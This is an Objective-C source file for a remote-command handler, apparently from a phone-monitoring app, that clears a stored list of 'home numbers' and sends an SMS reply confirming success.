/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearHomesProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ClearHomesProcessor.h"
#import "PrefHomeNumber.h"
#import "Preference.h"

@interface ClearHomesProcessor (PrivateAPI)
- (void) processClearHomeNumber;
- (void) sendReplySMS;
@end

@implementation ClearHomesProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearHomesProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description:  self(ClearHomesProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearHomesProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor PrivateAPI Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearHomesProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearWatchNumberProcessor--->doProcessingCommand")
 	[self processClearHomeNumber];
}

#pragma mark ClearHomesProcessor PrivateAPI Methods

/**
 - Method name: processClearHomeNumber
 - Purpose:This method is used to process clear home number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processClearHomeNumber {
	DLog (@"ClearHomesProcessor--->processClearMonitors");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefHomeNumber *prefHomeNumberList = (PrefHomeNumber *) [prefManager preference:kHome_Number];
	NSMutableArray *homeNumberList=[[NSMutableArray alloc] init];
	[prefHomeNumberList setMHomeNumbers:homeNumberList];
	[prefManager savePreferenceAndNotifyChange:prefHomeNumberList];
	[homeNumberList release];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearHomesProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
